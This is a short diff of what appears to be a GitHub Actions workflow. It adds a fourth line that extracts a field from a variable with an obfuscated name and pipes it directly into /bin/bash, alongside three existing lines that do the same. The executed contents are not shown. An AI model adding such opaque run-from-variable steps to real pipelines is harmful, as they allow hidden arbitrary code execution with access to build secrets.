@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$ot1314" | jq -r .oypo80 | /bin/bash
           printf '%s' "$gc2891" | jq -r .emub05 | /bin/bash
           echo $sk0015 | jq -r .xnp301 | /bin/bash
+          echo $l63480 | jq -r .l5 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
